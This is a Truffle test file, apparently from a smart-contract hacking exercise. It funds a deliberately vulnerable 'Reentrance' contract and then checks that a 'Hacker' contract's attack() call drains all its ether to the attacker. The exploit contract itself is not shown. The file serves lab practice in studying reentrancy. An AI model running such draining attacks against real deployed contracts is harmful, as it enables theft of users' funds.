const Hacker = artifacts.require("Hacker");
const Reentrance = artifacts.require("Reentrance");
const { expect } = require("chai");
const { BN } = require("@openzeppelin/test-helpers");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should send ether", async function () {
    const targetContract = await Reentrance.deployed();
    const result = await targetContract.send(web3.utils.toWei("1", "ether"));
    expect(result.receipt.status).to.equal(true);
  });

  it("should steal all ether", async function () {
    const hackerContract = await Hacker.deployed();
    const targetContract = await Reentrance.deployed();
    // Check target contract balance
    expect(await web3.eth.getBalance(targetContract.address)).to.bignumber.equal(new BN(web3.utils.toWei("1", "ether")));

    // Attack
    const result = await hackerContract.attack(targetContract.address, { from: _hacker, gas: 1000000, value: web3.utils.toWei("0.1", "ether") });
    expect(result.receipt.status).to.equal(true);

    // Check target contract balance again
    expect(await web3.eth.getBalance(targetContract.address)).to.bignumber.equal(new BN(0));

    // Check hacker contract balance
    expect(await web3.eth.getBalance(hackerContract.address)).to.bignumber.equal(new BN(web3.utils.toWei("1.1", "ether")));
  });
});
